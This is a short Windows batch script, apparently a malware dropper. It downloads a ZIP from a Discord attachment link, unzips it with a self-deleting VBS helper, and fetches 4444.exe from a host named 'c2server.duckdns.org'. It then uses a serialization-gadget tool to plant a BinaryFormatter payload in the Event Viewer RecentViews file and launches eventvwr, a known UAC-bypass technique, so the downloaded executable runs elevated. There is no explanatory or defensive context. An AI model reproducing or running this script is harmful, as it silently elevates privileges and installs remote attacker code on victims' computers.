@echo off

powershell Start-BitsTransfer -Source https://cdn.discordapp.com/attachments/951192813477965856/992485990788759583/UAC.zip -Destination C:\Users\Public -TransferType Download
setlocal
cd /d %~dp0
Call :UnZipFile "C:\Users\Public" "C:\Users\Public\UAC.zip"
exit /b

:UnZipFile <ExtractTo> <newzipfile>
set vbs="C:\Users\Public\_.vbs"
if exist %vbs% del /f /q %vbs%
>%vbs%  echo Set fso = CreateObject("Scripting.FileSystemObject")
>>%vbs% echo If NOT fso.FolderExists(%1) Then
>>%vbs% echo fso.CreateFolder(%1)
>>%vbs% echo End If
>>%vbs% echo set objShell = CreateObject("Shell.Application")
>>%vbs% echo set FilesInZip=objShell.NameSpace(%2).items
>>%vbs% echo objShell.NameSpace(%1).CopyHere(FilesInZip)
>>%vbs% echo Set fso = Nothing
>>%vbs% echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%
powershell Start-BitsTransfer -Source http://c2server.duckdns.org/4444.exe -Destination C:\Users\Public\UAC -TransferType Download
C:\Users\Public\UAC\run.exe -o raw -f BinaryFormatter -g DataSet -c "C:\Users\Public\UAC\4444.exe" > %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews
eventvwr



